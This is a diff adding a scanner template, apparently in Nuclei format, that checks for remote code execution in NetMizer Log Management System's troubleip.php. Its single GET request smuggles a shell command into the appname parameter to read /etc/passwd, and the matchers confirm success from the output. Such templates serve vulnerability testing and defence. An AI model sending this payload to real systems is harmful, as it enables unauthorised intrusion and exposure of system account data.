@@ -1,0 +1,25 @@
+id: poc-yaml-netmizer-log-ms-troubleip-php-rce
+info:
+  name: NetMizer Log Management System troubleip.php Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/data/search/troubleip.php?action=showtask&appname=search;cat%20/etc/passwd+%23+&id=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"success\":true"
+          - "root:"
+          - "/bin"
+          - "trouble_session"
+      - type: word
+        words:
+          - "<"
+        negative: true
